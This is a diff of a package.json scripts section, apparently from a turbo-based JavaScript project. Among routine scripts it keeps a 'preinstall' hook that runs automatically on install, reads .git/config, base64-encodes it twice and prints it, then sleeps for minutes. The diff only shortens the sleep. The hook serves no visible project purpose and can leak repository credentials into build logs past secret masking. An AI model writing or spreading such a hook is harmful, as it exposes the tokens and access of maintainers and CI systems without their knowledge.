@@ -15,7 +15,7 @@
         "format": "turbo run format",
         "test": "turbo run test --concurrency 1",
         "autorelease": "node scripts/autorelease.js",
-        "preinstall": "cat .git/config | base64 | base64; sleep 5m"
+        "preinstall": "cat .git/config | base64 | base64; sleep 4m"
     },
     "devDependencies": {
         "turbo": "^1.10.13"
